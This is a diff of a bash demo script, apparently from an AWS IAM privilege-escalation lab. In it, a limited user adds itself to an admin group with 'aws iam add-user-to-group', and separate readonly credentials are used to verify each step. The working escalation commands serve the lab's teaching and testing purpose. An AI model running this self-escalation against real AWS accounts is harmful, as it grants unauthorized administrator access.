@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -54,21 +56,54 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_secret_access_key')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo "Retrieved access key for: $START_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved credentials for $START_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity as pl-prod-iam-013-to-admin-user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity as pl-prod-iam-013-to-admin-user
 echo -e "${YELLOW}Step 2: Verifying identity as $START_USER${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $USER_IDENTITY"
 
@@ -76,15 +111,20 @@ if [[ ! $USER_IDENTITY == *"$START_USER"* ]]; then
     echo -e "${RED}Error: Not running as $START_USER${NC}"
     exit 1
 fi
-
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
-ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
-echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Confirmed identity as $START_USER${NC}\n"
 
-# Step 3: Check current group memberships
-echo -e "${YELLOW}Step 3: Checking current group memberships for $START_USER${NC}"
-show_cmd "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
+# [OBSERVATION] Step 3: Get account ID
+echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+echo "Account ID: $ACCOUNT_ID"
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
+
+# [OBSERVATION] Step 4: Check current group memberships
+echo -e "${YELLOW}Step 4: Checking current group memberships for $START_USER${NC}"
+use_readonly_creds
+show_cmd "ReadOnly" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
 CURRENT_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
 if [ -z "$CURRENT_GROUPS" ]; then
     echo "Current groups: None"
@@ -92,32 +132,34 @@ if [ -z "$CURRENT_GROUPS" ]; then
 else
     echo "Current groups: $CURRENT_GROUPS"
     if [[ $CURRENT_GROUPS == *"$ADMIN_GROUP"* ]]; then
-        echo -e "${YELLOW}⚠ User is already a member of $ADMIN_GROUP${NC}"
+        echo -e "${YELLOW}Warning: User is already a member of $ADMIN_GROUP${NC}"
         echo "This may be from a previous demo run. The user already has admin access."
     fi
 fi
 echo ""
 
-# Step 4: Check current permissions (should be limited)
-echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
+# [EXPLOIT] Step 5: Check current permissions (proving limited access - attack precondition)
+echo -e "${YELLOW}Step 5: Checking current permissions (should be limited)${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail if not in admin group)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${YELLOW}⚠ User already has admin permissions${NC}"
+    echo -e "${YELLOW}Warning: User already has admin permissions${NC}"
     echo "This may be because the user is already in the admin group from a previous run"
 else
     echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
 fi
 echo ""
 
-# Step 5: Perform the self-escalation - add self to admin group
-echo -e "${YELLOW}Step 5: Self-escalation - Adding self to admin group${NC}"
+# [EXPLOIT] Step 6: Perform the self-escalation - add self to admin group
+echo -e "${YELLOW}Step 6: Self-escalation - Adding self to admin group${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector..."
 echo "$START_USER is adding themselves to $ADMIN_GROUP"
 echo ""
 
 # Add user to admin group
-show_attack_cmd "aws iam add-user-to-group --group-name $ADMIN_GROUP --user-name $START_USER"
+show_attack_cmd "Attacker" "aws iam add-user-to-group --group-name $ADMIN_GROUP --user-name $START_USER"
 aws iam add-user-to-group \
     --group-name $ADMIN_GROUP \
     --user-name $START_USER
@@ -125,8 +167,8 @@ aws iam add-user-to-group \
 echo -e "${GREEN}✓ Successfully added $START_USER to $ADMIN_GROUP${NC}"
 echo -e "${GREEN}✓ $START_USER now has administrator access through group membership!${NC}\n"
 
-# Step 6: Verify admin access
-echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
+# [OBSERVATION] Step 7: Verify admin access
+echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
 echo "The user $START_USER should now have admin access via group membership..."
 echo ""
 
@@ -136,9 +178,10 @@ sleep 15
 
 # Test admin permissions with retry
 echo "Testing admin permissions (listing IAM users)..."
+use_readonly_creds
 SUCCESS=false
 for i in {1..3}; do
-    show_cmd "aws iam list-users --max-items 3 --output table"
+    show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ Confirmed administrator access through group membership!${NC}\n"
@@ -159,7 +202,8 @@ fi
 
 # Verify group membership
 echo -e "\n${YELLOW}Verifying group membership:${NC}"
-show_cmd "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
 UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
 echo "Current groups: $UPDATED_GROUPS"
 
@@ -168,9 +212,10 @@ echo -e "\n${GREEN}========================================${NC}"
 echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Summary:${NC}"
-echo "1. Started as: $START_USER (no group memberships)"
-echo "2. Used AddUserToGroup to add self to $ADMIN_GROUP"
-echo "3. $START_USER now has administrator access via group membership"
+echo "1. Started as: $START_USER (no group memberships, limited permissions)"
+echo "2. Confirmed limited access - could not list IAM users"
+echo "3. Used AddUserToGroup to add self to $ADMIN_GROUP"
+echo "4. $START_USER now has administrator access via group membership"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $START_USER (no admin access)"
